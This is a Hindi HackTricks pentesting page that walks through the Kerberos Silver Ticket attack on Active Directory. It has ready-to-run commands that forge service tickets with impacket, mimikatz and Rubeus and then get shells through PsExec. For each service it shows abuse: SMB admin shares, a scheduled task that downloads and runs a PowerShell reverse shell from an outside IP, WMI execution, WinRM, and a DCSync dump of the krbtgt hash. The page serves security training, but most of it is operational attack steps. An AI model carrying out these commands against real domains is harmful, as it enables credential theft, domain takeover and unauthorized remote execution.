# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **साइन अप करें** **Intigriti** के लिए, एक प्रीमियम **बग बाउंटी प्लेटफार्म जो हैकर्स द्वारा, हैकर्स के लिए बनाया गया है**! आज ही हमसे जुड़ें [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) पर, और **$100,000** तक के बाउंटी कमाना शुरू करें!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

**Silver Ticket** हमला Active Directory (AD) वातावरण में सेवा टिकटों के शोषण से संबंधित है। यह विधि **एक सेवा खाते का NTLM हैश प्राप्त करने** पर निर्भर करती है, जैसे कि एक कंप्यूटर खाता, ताकि एक Ticket Granting Service (TGS) टिकट को forge किया जा सके। इस forged टिकट के साथ, एक हमलावर नेटवर्क पर विशिष्ट सेवाओं तक पहुँच सकता है, **किसी भी उपयोगकर्ता का अनुकरण करते हुए**, आमतौर पर प्रशासनिक विशेषाधिकारों के लिए लक्ष्य बनाते हुए। यह जोर दिया गया है कि टिकटों को forge करने के लिए AES कुंजियों का उपयोग करना अधिक सुरक्षित और कम पहचानने योग्य है।

टिकट बनाने के लिए, विभिन्न उपकरणों का उपयोग किया जाता है जो ऑपरेटिंग सिस्टम के आधार पर होते हैं:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### विंडोज़ पर
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS सेवा को पीड़ित की फ़ाइल प्रणाली तक पहुँचने के लिए एक सामान्य लक्ष्य के रूप में उजागर किया गया है, लेकिन HOST और RPCSS जैसी अन्य सेवाओं का भी कार्यों और WMI प्रश्नों के लिए शोषण किया जा सकता है।

## उपलब्ध सेवाएँ

| सेवा प्रकार                                 | सेवा सिल्वर टिकट्स                                                       |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                  |
| PowerShell रिमोटिंग                       | <p>HOST</p><p>HTTP</p><p>OS के आधार पर भी:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>कुछ अवसरों पर आप बस पूछ सकते हैं: WINRM</p>   |
| अनुसूचित कार्य                             | HOST                                                                     |
| Windows फ़ाइल शेयर, साथ ही psexec        | CIFS                                                                     |
| LDAP संचालन, जिसमें DCSync शामिल है      | LDAP                                                                     |
| Windows रिमोट सर्वर प्रशासन उपकरण        | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                       |
| गोल्डन टिकट्स                             | krbtgt                                                                   |

**Rubeus** का उपयोग करके आप निम्नलिखित पैरामीटर का उपयोग करके **सभी** इन टिकटों के लिए **पूछ सकते हैं**:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### सिल्वर टिकट्स इवेंट आईडी

- 4624: खाता लॉगिन
- 4634: खाता लॉगआउट
- 4672: व्यवस्थापक लॉगिन

## सेवा टिकटों का दुरुपयोग

निम्नलिखित उदाहरणों में कल्पना करें कि टिकट को व्यवस्थापक खाते का अनुकरण करते हुए पुनः प्राप्त किया गया है।

### CIFS

इस टिकट के साथ आप `C$` और `ADMIN$` फ़ोल्डर तक पहुँचने में सक्षम होंगे **SMB** के माध्यम से (यदि वे उजागर हैं) और फ़ाइलों को दूरस्थ फ़ाइल प्रणाली के एक भाग में कॉपी कर सकते हैं, बस कुछ ऐसा करके:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
आप होस्ट के अंदर एक शेल प्राप्त करने या **psexec** का उपयोग करके मनमाने आदेश निष्पादित करने में भी सक्षम होंगे:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

इस अनुमति के साथ, आप दूरस्थ कंप्यूटरों में अनुसूचित कार्य उत्पन्न कर सकते हैं और मनमाने आदेश निष्पादित कर सकते हैं:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

इन टिकटों के साथ आप **शिकार प्रणाली में WMI निष्पादित कर सकते हैं**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
**wmiexec** के बारे में **अधिक जानकारी** निम्नलिखित पृष्ठ पर प्राप्त करें:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

winrm के माध्यम से एक कंप्यूटर पर पहुँचने पर आप **इसका उपयोग कर सकते हैं** और यहाँ तक कि एक PowerShell प्राप्त कर सकते हैं:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
इस पृष्ठ को देखें ताकि आप **winrm का उपयोग करके एक दूरस्थ होस्ट से कनेक्ट करने के अधिक तरीके** जान सकें:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> ध्यान दें कि **winrm को दूरस्थ कंप्यूटर पर सक्रिय और सुनने वाला होना चाहिए** ताकि आप इसे एक्सेस कर सकें।

### LDAP

इस विशेषाधिकार के साथ आप **DCSync** का उपयोग करके DC डेटाबेस को डंप कर सकते हैं:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync के बारे में अधिक जानें** निम्नलिखित पृष्ठ पर:

## संदर्भ

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**बग बाउंटी टिप**: **साइन अप करें** **Intigriti** के लिए, एक प्रीमियम **बग बाउंटी प्लेटफॉर्म जो हैकर्स द्वारा, हैकर्स के लिए बनाया गया है**! आज ही [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) पर हमारे साथ जुड़ें, और **$100,000** तक की बाउंटी कमाना शुरू करें!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
